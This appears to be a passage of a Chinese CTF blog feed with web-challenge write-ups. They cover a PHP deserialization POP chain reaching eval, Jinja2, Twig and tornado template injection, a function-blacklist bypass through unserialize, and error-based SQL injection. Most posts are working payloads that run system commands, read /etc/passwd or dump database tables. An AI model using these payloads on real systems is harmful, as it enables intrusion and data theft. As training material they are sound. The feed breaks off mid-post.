    <content type="html"><![CDATA[<blockquote><h1 id="MoeCTF-2021-unserialize"><a href="#MoeCTF-2021-unserialize" class="headerlink" title="[MoeCTF 2021]unserialize"></a>[MoeCTF 2021]unserialize</h1></blockquote><p>1.题目源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">class entrance</span><br><span class="line">&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    function __construct($start)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start = $start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start-&gt;helloworld();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class springboard</span><br><span class="line">&#123;</span><br><span class="line">    public $middle;</span><br><span class="line"></span><br><span class="line">    function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil</span><br><span class="line">&#123;</span><br><span class="line">    public $end;</span><br><span class="line">    function __construct($end)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;end = $end;</span><br><span class="line">    &#125;</span><br><span class="line">    function __get($Attribute)</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;serialize&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;serialize&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.构造pop链，这里攻击点就是eval语句</p><p>所以最后要触发的就是<code>evil</code>的<code>__get()</code>魔术方法</p><p><mark>__get() ：获得一个类的不可访问或者不存在的成员变量时调用</mark></p><p>知道了<code>__get()</code>的触发方式，这里也就找到了<code>springboard</code>的<code>__call()</code>魔术方法</p><p><mark>__call()：在对象上下文中调用不可访问的方法时触发</mark></p><p>在向上找，就是<code>entrance</code>的<code>__destruct()</code></p><p><mark>__destruct() ：对象被销毁时触发</mark></p><p>构造exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class entrance</span><br><span class="line">&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    function __construct($start)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start = $start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start-&gt;helloworld();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class springboard</span><br><span class="line">&#123;</span><br><span class="line">    public $middle;</span><br><span class="line"></span><br><span class="line">    function __construct($middle)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;middle = $middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil</span><br><span class="line">&#123;</span><br><span class="line">    public $end;</span><br><span class="line">    function __construct($end)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;end = $end;</span><br><span class="line">    &#125;</span><br><span class="line">    function __get($Attribute)</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new entrance(new springboard(new evil(&quot;system(&#x27;ls /&#x27;);&quot;)));</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?serialize=O:8:&quot;entrance&quot;:1:&#123;s:5:&quot;start&quot;;O:11:&quot;springboard&quot;:1:&#123;s:6:&quot;middle&quot;;O:4:&quot;evil&quot;:1:&#123;s:3:&quot;end&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;MoeCTF-2021-unserialize&quot;&gt;&lt;a href=&quot;#MoeCTF-2021-unserialize&quot; class=&quot;headerlink&quot; title=&quot;[MoeCTF 2021]unserialize&quot;&gt;&lt;/a&gt;[Mo</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="反序列化" scheme="http://1768161086.github,io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Web_python_template_injection</title>
    <link href="http://1768161086.github,io/2025/02/10/Web-python-template-injection/"/>
    <id>http://1768161086.github,io/2025/02/10/Web-python-template-injection/</id>
    <published>2025-02-10T02:10:52.000Z</published>
    <updated>2025-02-15T02:30:40.469Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h1></blockquote><p>考点：</p><p><a href="https://www.freebuf.com/column/187845.html">flask模板注入</a>如有不懂可看这篇文章</p><p>魔术方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>1.判断有无模板注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/&#123;&#123;7+7&#125;&#125;</span><br></pre></td></tr></table></figure><p>查看全局变量:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure><p>思路：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p><p>寻找可用引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以看到有一个type file类型(可以进行文件读取)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>找到flag文件后读取flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;Web-python-template-injection&quot;&gt;&lt;a href=&quot;#Web-python-template-injection&quot; class=&quot;headerlink&quot; title=&quot;Web_python_template_i</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="flask模板注入" scheme="http://1768161086.github,io/tags/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>竞争条件</title>
    <link href="http://1768161086.github,io/2025/02/09/%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/"/>
    <id>http://1768161086.github,io/2025/02/09/%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/</id>
    <published>2025-02-09T08:22:54.000Z</published>
    <updated>2025-02-09T08:24:21.360Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="CTF文件包含中竞争条件实现"><a href="#CTF文件包含中竞争条件实现" class="headerlink" title="CTF文件包含中竞争条件实现"></a>CTF文件包含中竞争条件实现</h1></blockquote><h2 id="1-条件竞争介绍"><a href="#1-条件竞争介绍" class="headerlink" title="1.条件竞争介绍"></a>1.条件竞争介绍</h2><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。例如网站文件上传，开发人员通过检测文件后缀名，设置白名单黑名单各种方式判断用户上传文件是否为危险文件，一旦发现，就会立马发现。同样的，若是我们在判断和删除事件这一时间差内进行一些操作岂不是也会成功？</p><h2 id="2-相关实验"><a href="#2-相关实验" class="headerlink" title="2.相关实验"></a>2.相关实验</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;CTF文件包含中竞争条件实现&quot;&gt;&lt;a href=&quot;#CTF文件包含中竞争条件实现&quot; class=&quot;headerlink&quot; title=&quot;CTF文件包含中竞争条件实现&quot;&gt;&lt;/a&gt;CTF文件包含中竞争条件实现&lt;/h1&gt;&lt;/blockquote</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="竞争条件" scheme="http://1768161086.github,io/tags/%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>buuctf_phpweb</title>
    <link href="http://1768161086.github,io/2025/02/07/buuctf-phpweb/"/>
    <id>http://1768161086.github,io/2025/02/07/buuctf-phpweb/</id>
    <published>2025-02-07T01:31:12.000Z</published>
    <updated>2025-02-15T01:56:38.060Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1></blockquote><p>题目环境：</p><p><img src="/2025/02/07/buuctf-phpweb/Users/xu/hexo-blog/source/_posts/buuctf-phpweb/1.png" alt="loading-ag-66"></p><p>1.打开页面发现时间一直在变，抓包看看有没有更多信息</p><p>发现index.php用post方式提交了两个参数，func和p</p><p>2.那我们可以猜测func参数接受的是一个函数，p参数接受的是函数执行的内容，我们可以输入参数md5和1进行测试，结果显示为1的md5值</p><p>尝试读取下当前的目录信息，payload：func&#x3D;system&amp;p&#x3D;ls，显示hacking，应该是被过滤掉了</p><p>3.这里我们需要查看页面源代码，进行代码审计，可用file_get_contents()、highlight_file() ，show_source()等或者用伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>4.在代码里注意到了__destruct()函数，此函数会在类被销毁时调用，那我们如果反序列化一个类，在类里的参数中写上我们要执行的代码和函数，这样的话就会直接调用gettime函数，而不会执行in_array($func,$disable_fun)，那我们就绕过了黑名单的判断，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; </span><br></pre></td></tr></table></figure><p>序列化代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;ls&quot;;</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$test = new Test();</span><br><span class="line">$str = serialize($test);</span><br><span class="line">print($str);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>5.成功绕过黑名单，接下来查找flag的位置，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find+/+-name+flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><p>序列化代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;find / -name flag*&quot;;</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$test = new Test();</span><br><span class="line">$str = serialize($test);</span><br><span class="line">print($str);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>6.获取flag位置后，修改参数读取flag，payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat+/tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><p>序列化代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$test = new Test();</span><br><span class="line">$str = serialize($test);</span><br><span class="line">print($str);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>也可使用func&#x3D;\system&amp;p&#x3D;find &#x2F; -name flag*来绕过黑名单检测</p><p>php内的” \ “在做代码执行的时候，会识别特殊字符串，绕过黑名单</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;网鼎杯-2020-朱雀组-phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]phpweb&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]p</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="反序列化" scheme="http://1768161086.github,io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>buuctf_The mystery of ip</title>
    <link href="http://1768161086.github,io/2025/02/05/buuctf-The-mystery-of-ip/"/>
    <id>http://1768161086.github,io/2025/02/05/buuctf-The-mystery-of-ip/</id>
    <published>2025-02-05T01:22:57.000Z</published>
    <updated>2025-02-15T01:30:30.304Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1></blockquote><p>题目环境：</p><p><img src="/2025/02/05/buuctf-The-mystery-of-ip/Users/xu/hexo-blog/source/_posts/buuctf-The-mystery-of-ip/1.png" alt="loading-ag-67"></p><p>添加HTTP请求头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1</span><br></pre></td></tr></table></figure><p>被成功执行，说明<code>XFF</code>可控，测试了半天，因为是php页面，所以没想到模版注入，通过查阅资料<br><strong>Flask</strong>可能存在<strong>Jinjia2模版注入漏洞</strong><br><strong>PHP</strong>可能存在<strong>Twig模版注入漏洞</strong></p><p>添加模版算式，检测其是否可被执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>模版中算式被成功执行，尝试是否能执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>命令可以被成功执行，查找flag的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>/</code>目录下查找到flag，读取flag，构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;BJDCTF2020-The-mystery-of-ip&quot;&gt;&lt;a href=&quot;#BJDCTF2020-The-mystery-of-ip&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]The mystery</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="X-Forwarded-For注入" scheme="http://1768161086.github,io/tags/X-Forwarded-For%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>buuctf_HardSQL</title>
    <link href="http://1768161086.github,io/2025/02/03/HardSQL/"/>
    <id>http://1768161086.github,io/2025/02/03/HardSQL/</id>
    <published>2025-02-03T00:56:21.000Z</published>
    <updated>2025-02-15T01:14:37.142Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1></blockquote><p>题目环境：</p><p><img src="/2025/02/03/HardSQL/Users/xu/hexo-blog/source/_posts/HardSQL/1.png" alt="loading-ag-97"></p><p>由题目可知是sql注入</p><p>1.使用万能密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>发现了一句话:你可别被我逮住了，臭弟弟</p><p>其中union，select，order by等都被过滤了</p><p>2.输入查询列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; order by 3#</span><br></pre></td></tr></table></figure><p>通过常规注入回显的都是这句话</p><p>3.我们尝试报错注入</p><p>报错注入有两个函数，这里我们使用updatexml(a,b,c)，此函数a，c必须为String类型，因此可以使a,c不为String型进行报错</p><p>(1)我们先去爆数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x5c,(select(database()))))%23</span><br></pre></td></tr></table></figure><p>于是我们知道了库名叫：geek</p><p>(2)爆表名,但是这里把等于号给我们过滤了，不过我们知道like用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))</span><br></pre></td></tr></table></figure><p>于是爆出表名：H4rdSQ1</p><p>(3)爆列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23</span><br></pre></td></tr></table></figure><p>于是爆出表名:id,username,password</p><p>(4)爆数据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23&amp;password=1</span><br></pre></td></tr></table></figure><p>这里因为用extractvalue()函数，一次只能显示32个字符，我们需要用right函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=1</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;极客大挑战-2019-HardSQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-HardSQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]HardSQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]HardSQ</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="sql注入" scheme="http://1768161086.github,io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-easy_tornado</title>
    <link href="http://1768161086.github,io/2025/02/01/buuctf-easy-tornado/"/>
    <id>http://1768161086.github,io/2025/02/01/buuctf-easy-tornado/</id>
    <published>2025-02-01T00:36:26.000Z</published>
    <updated>2025-02-15T00:53:42.930Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1></blockquote><p>题目环境：</p><p><img src="/2025/02/01/buuctf-easy-tornado/Users/xu/hexo-blog/source/_posts/buuctf-easy-tornado/1.png" alt="loading-ag-67"></p><p>打开flag.txt发现了flag的目录：&#x2F;fllllllllllllag</p><p>打开huns.txt发现了md5(cookie_secret+md5(filename))</p><p>因此可用推测该题是利用cookie_secret和文件名计算MD5来获取flag。</p><ul><li><p>注意题目easy_tornado；tornado是python的一个模板，可以看出这道题是模板注入类的题目</p></li><li><p>模板注入必须通过传输型如的执行命令</p></li></ul><p><img src="file:///C:/Users/xu/Pictures/Typedown/92f98a55-6fe8-40f5-8710-53ed4f30a90d.png" alt="92f98a55-6fe8-40f5-8710-53ed4f30a90d"></p><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量。</p><p>简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。</p><p>接着我们爆cookie_secret</p><figure class="highlight 